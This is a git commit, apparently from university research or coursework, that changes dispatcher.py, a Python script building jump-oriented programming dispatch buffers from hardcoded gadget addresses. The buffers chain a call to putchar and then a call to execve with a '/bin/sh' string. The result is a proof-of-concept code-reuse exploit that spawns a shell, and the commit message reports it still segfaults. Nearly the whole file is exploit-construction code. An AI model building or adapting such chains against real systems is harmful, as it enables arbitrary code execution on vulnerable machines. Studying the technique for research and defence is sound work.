949414b2ad598eb810be075e3cea91b8a5b4bfb4
Daniel Starikov <starikov@uw.edu>
2020-11-25 23:53:22 -0800

    putchar works but segfaults after because a3 is clobbered

--- dispatcher.py
+++ dispatcher.py
@@ -1,6 +1,14 @@
 class dispatchBuf():
-    def __init__(self):
+    def __init__(self, buf_ptr):
         self.buf = [0 for i in range(49)]
+        if isinstance(buf_ptr, int):
+            self.dispatch_buf = buf_ptr
+            self.next_dispatch_buf = buf_ptr + 392
+        else:
+            self.dispatch_buf = buf_ptr.next_dispatch_buf
+            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + 392
+
+        self.set_s3(self.next_dispatch_buf)
     
     def set_t1(self, t1):
         self.buf[22] = t1
@@ -56,43 +64,44 @@ set_t0_s3_jump_a3 = 0x200007be24
 bin_sh_str = 0x20001178a8
 execve = 0x20000ad180
 putchar = 0x2000080bcc
-putchar_unlocked = 0x2000080cea
+mv_a0a1a2_jalr_a5 = 0x2000067010
+jalr_a5 = 0x200006701a
 
-# Where the dispatchbuf is loaded into memory
-first_dispatchbuf_ptr = 0x20000000
 
 dispatch_file = open('dispatch.txt', 'w')
 
-# Second dispatch buf
-next_dispatchbuf_ptr = first_dispatchbuf_ptr + 392
-
 # Initial buffer jumps to a useless gadget for proof-of-concept chaining
-buf1 = dispatchBuf()
-
+buf1 = dispatchBuf(0x20000000)
 buf1.set_t1(set_t0_s3_jump_a3)
 buf1.set_a3(load_from_t0)
-buf1.set_s3(next_dispatchbuf_ptr)
 # Initial jump for start_jop.S
 buf1.buf[0] = load_from_t0
 
-# This buffer jumps to putchar
-buf2 = dispatchBuf()
-buf2.set_a0(ord('c'))
-# Set the stack to the first buf ptr as this shouldn't be used anymore
-buf2.set_sp(first_dispatchbuf_ptr + 48)
+buf2 = dispatchBuf(buf1)
+buf2.set_t1(set_t0_s3_jump_a3)
+buf2.set_a3(load_from_t0)
+
+# This buffer jumps to jalr a5 which then goes to putchar
+buf3 = dispatchBuf(buf2)
+buf3.set_a0(ord('c'))
+# Set the stack to the second buf ptr as this shouldn't be used anymore
+buf3.set_a3(load_from_t0)
+buf3.set_sp(buf2.dispatch_buf)
 # Jump to gadget which moves to next dispatcher
-buf2.set_ra(set_t0_s3_jump_a3)
-buf2.set_t1(putchar)
+buf3.set_ra(set_t0_s3_jump_a3)
+buf3.set_t1(putchar)
 
 # This buffer jumps to execve and executes "/bin/sh"
-buf3 = dispatchBuf()
-buf3.set_a0(bin_sh_str)
-buf3.set_a1(0)
-buf3.set_a2(0)
-buf3.set_t1(execve)
+buf4 = dispatchBuf(buf3)
+buf4.set_a0(bin_sh_str)
+buf4.set_a1(0)
+buf4.set_a2(0)
+buf4.set_t1(execve)
 
 dispatch_file.write(str(buf1))
 dispatch_file.write(str(buf2))
 dispatch_file.write(str(buf3))
+dispatch_file.write(str(buf4))
+# dispatch_file.write(str(buf5))
 
 dispatch_file.close()
